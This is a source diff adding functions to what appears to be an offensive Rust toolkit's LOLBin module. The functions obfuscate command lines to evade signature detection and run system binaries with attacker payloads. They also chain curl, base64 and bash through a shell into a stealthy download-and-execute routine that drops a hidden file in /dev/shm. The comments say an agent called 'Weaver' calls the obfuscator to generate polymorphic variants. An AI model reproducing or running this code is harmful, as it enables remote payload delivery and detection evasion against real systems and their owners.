@@ -111,6 +111,115 @@ pub fn lolbin_download_exec(url: &str) -> bool {
     false
 }
 
+// ── Weaver integration: CLI obfuscation ──────────────────────────────
+
+/// Obfuscate a LOLBin command line to avoid signature detection.
+/// The Weaver agent calls this to generate polymorphic CLI variants.
+pub fn weaver_obfuscate(cmd: &str) -> String {
+    let mut obfuscated = cmd.to_string();
+
+    // Technique 1: randomize case (PowerShell case-insensitive)
+    if cmd.contains("powershell") || cmd.contains("cmd") {
+        obfuscated = obfuscated.chars()
+            .map(|c| if c.is_ascii_alphabetic() && rand::random() { c.to_ascii_uppercase() } else { c })
+            .collect();
+    }
+
+    // Technique 2: insert random environment variable expansions
+    if cmd.contains("curl") || cmd.contains("wget") {
+        let vars = ["%USERPROFILE%", "%TEMP%", "%SYSTEMROOT%", "${HOME}", "/var/tmp"];
+        let v = vars[rand::random::<usize>() % vars.len()];
+        obfuscated = obfuscated.replace(" -", &format!(" {}/..{} -", v, v));
+    }
+
+    // Technique 3: double-encoding tricks
+    if cmd.contains("bash") || cmd.contains("python") {
+        obfuscated = format!("$(echo {}|rev|rev)", obfuscated);
+    }
+
+    // Technique 4: random spacing/quoting
+    obfuscated = obfuscated.replace(" ", "  ").replace("  ", " ");
+    if rand::random() {
+        obfuscated = obfuscated.replace("'", "\"'\"");
+    }
+
+    info!("LOLBIN: obfuscated CLI: {}...", &obfuscated[..80.min(obfuscated.len())]);
+    obfuscated
+}
+
+/// Execute a LOLBin with Weaver-obfuscated command line.
+pub fn lolbin_exec_obfuscated(lolbin: &Lolbin, payload: &str) -> bool {
+    let cmd_str = lolbin.technique
+        .replace("<url>", payload)
+        .replace("<host>", payload)
+        .replace("<b64>", payload)
+        .replace("cmd", payload);
+    let obfuscated = weaver_obfuscate(&cmd_str);
+
+    let parts: Vec<&str> = obfuscated.split_whitespace().collect();
+    if parts.is_empty() { return false; }
+    let binary = parts[0];
+    let args: Vec<&str> = parts[1..].to_vec();
+
+    match Command::new(binary).args(&args).spawn() {
+        Ok(child) => {
+            info!("LOLBIN: {} executed (obfuscated, PID: {:?})", lolbin.name, child.id());
+            true
+        }
+        Err(e) => {
+            warn!("LOLBIN: {} obfuscated exec failed: {}", lolbin.name, e);
+            false
+        }
+    }
+}
+
+/// Chain multiple LOLBins for layered execution.
+/// Example: curl downloads → base64 decodes → bash executes
+pub fn lolbin_chain(chain: &[(&str, &str)]) -> bool {
+    if chain.is_empty() { return false; }
+
+    let cmd = chain.iter()
+        .map(|(name, payload)| {
+            let lb = LOLBINS.iter().find(|l| l.name == *name);
+            lb.map(|l| l.technique.replace("<url>", payload).replace("<b64>", payload).replace("cmd", payload))
+                .unwrap_or_default()
+        })
+        .collect::<Vec<_>>()
+        .join(" | ");
+
+    info!("LOLBIN chain: {}", cmd);
+    match Command::new("sh").arg("-c").arg(&cmd).spawn() {
+        Ok(child) => {
+            info!("LOLBIN chain executed (PID: {:?})", child.id());
+            true
+        }
+        Err(e) => {
+            warn!("LOLBIN chain failed: {}", e);
+            false
+        }
+    }
+}
+
+/// Build a stealth download-execute chain using available LOLBins.
+pub fn stealth_download_exec(url: &str) -> bool {
+    let available: Vec<_> = discover_available().into_iter()
+        .filter(|lb| lb.stealth >= 7)
+        .collect();
+
+    if available.len() >= 2 {
+        let downloader = available.iter().find(|lb| lb.mitre_id == "T1105");
+        let executor = available.iter().find(|lb| lb.mitre_id.starts_with("T1059"));
+        if let (Some(dl), Some(ex)) = (downloader, executor) {
+            return lolbin_chain(&[(dl.name, url), (ex.name, "/dev/shm/.p")]);
+        }
+    }
+
+    // Fallback: single LOLBin download+exec
+    lolbin_download_exec(url)
+}
+
+// ── Tests ──────────────────────────────────────────────────────────────
+
 #[cfg(test)]
 mod tests {
     use super::*;
